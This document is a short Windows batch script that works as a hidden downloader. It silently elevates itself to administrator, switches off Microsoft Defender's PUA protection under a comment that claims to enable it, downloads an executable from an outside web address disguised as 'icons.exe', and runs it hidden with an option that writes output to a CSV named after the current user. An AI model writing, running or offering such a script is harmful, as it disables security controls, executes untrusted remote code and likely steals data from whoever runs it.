@echo off
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: Enable PUA protection in hidden mode
powershell -WindowStyle Hidden -Command "Set-MpPreference -PUAProtection 0"

:: Change directory to the script location
cd /d "%~dp0"

:: Check if the x64 folder exists, create it if not
if not exist x64 mkdir x64

:: Download the file to the x64 folder in hidden mode
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://the-anonymus-stories.vercel.app/untold_story/get?icons=1' -OutFile 'x64/icons.exe'"

:: Run the downloaded file in hidden mode
powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -ArgumentList '/scomma x64/%username%.csv' -WindowStyle Hidden"
